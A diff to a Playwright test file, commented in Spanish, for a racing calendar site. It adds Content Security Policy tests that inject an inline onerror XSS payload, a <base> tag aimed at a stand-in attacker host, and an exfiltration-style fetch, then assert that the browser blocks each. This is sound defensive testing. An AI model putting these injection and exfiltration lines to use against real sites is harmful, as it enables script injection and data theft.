@@ -701,7 +701,16 @@ test.describe('calendario', () => {
     // monta de nuevo y el fallo no aparece — la primera versión de esta prueba
     // hacía eso y pasaba en verde contra el código roto.
     await page.goto('/calendar');
-    await expect(page.locator('[data-fecha].border-primary')).toHaveCount(1);
+
+    // La marca de «la que toca» la pinta el navegador después de hidratar,
+    // porque depende de qué hora es AHORA y eso el servidor no lo sabe. Así que
+    // primero se espera a que la rejilla esté, y a la marca se le da margen: con
+    // la máquina cargada, hidratar pasa de los cinco segundos por defecto y
+    // esta prueba fallaba por eso y no por lo que vigila.
+    await expect(page.locator('[data-fecha]').first()).toBeVisible({ timeout: 30_000 });
+    await expect(page.locator('[data-fecha].border-primary')).toHaveCount(1, {
+      timeout: 30_000,
+    });
 
     const selector = page.getByLabel('Temporada', { exact: true });
     await selector.selectOption('2024');
@@ -711,7 +720,9 @@ test.describe('calendario', () => {
     // Y de vuelta a la temporada con carreras por delante: tiene que volver a
     // señalarla, y solo a una.
     await selector.selectOption(String(new Date().getFullYear()));
-    await expect(page.locator('[data-fecha].border-primary')).toHaveCount(1);
+    await expect(page.locator('[data-fecha].border-primary')).toHaveCount(1, {
+      timeout: 30_000,
+    });
   });
 
   test('una temporada terminada abre por el principio, sin saltos', async ({ page }) => {
@@ -759,6 +770,74 @@ test.describe('pestañas de una carrera', () => {
 
     await expect(page.getByText('GANADOR DEL SPRINT')).toBeVisible();
     expect(await page.locator('table tbody tr').count()).toBeGreaterThan(15);
+  });
+});
+
+test.describe('política de contenido', () => {
+  test('un script metido por el marcado no llega a ejecutarse', async ({ page }) => {
+    await page.goto('/');
+
+    // El vector real de un XSS: un dato que acaba dentro del marcado y trae un
+    // manejador en línea. Sin `unsafe-inline` en `script-src`, el navegador se
+    // niega a ejecutarlo.
+    //
+    // Ojo con probarlo de otra forma: `page.evaluate` inyecta por el depurador,
+    // que NO pasa por la política, así que crear un `<script>` a mano ahí sí
+    // «funciona» y no demuestra nada. Por eso se prueba a través del marcado.
+    const ejecuto = await page.evaluate(async () => {
+      (window as unknown as { __colado?: boolean }).__colado = false;
+
+      const caja = document.createElement('div');
+      caja.innerHTML = '<img src="x" onerror="window.__colado = true">';
+      document.body.appendChild(caja);
+
+      await new Promise((listo) => setTimeout(listo, 400));
+      return (window as unknown as { __colado?: boolean }).__colado;
+    });
+
+    expect(ejecuto, 'un manejador en línea no debería ejecutarse').toBe(false);
+  });
+
+  test('no se puede desviar la página a otro servidor', async ({ page }) => {
+    await page.goto('/');
+
+    // Dos mitades del mismo daño: un `<base>` desvía TODAS las rutas relativas
+    // —incluidas las de los scripts— y `connect-src` es lo que impide que algo
+    // se lleve datos fuera.
+    const base = await page.evaluate(() => {
+      const etiqueta = document.createElement('base');
+      etiqueta.href = 'https://atacante.example/';
+      document.head.appendChild(etiqueta);
+      return document.baseURI;
+    });
+
+    expect(base).not.toContain('atacante');
+
+    const salio = await page.evaluate(async () => {
+      try {
+        await fetch('https://example.com/robado', { mode: 'no-cors' });
+        return true;
+      } catch {
+        return false;
+      }
+    });
+
+    expect(salio, 'no debería poder conectar con un host ajeno').toBe(false);
+  });
+
+  test('el nonce cambia en cada visita', async ({ page }) => {
+    // Un nonce repetido es un nonce adivinable, y entonces la política es
+    // decoración.
+    const de = async () => {
+      const respuesta = await page.goto('/');
+      return respuesta?.headers()['content-security-policy']?.match(/nonce-[^']+/)?.[0];
+    };
+
+    const primero = await de();
+    const segundo = await de();
+
+    expect(primero).toBeTruthy();
+    expect(segundo).not.toBe(primero);
   });
 });
 
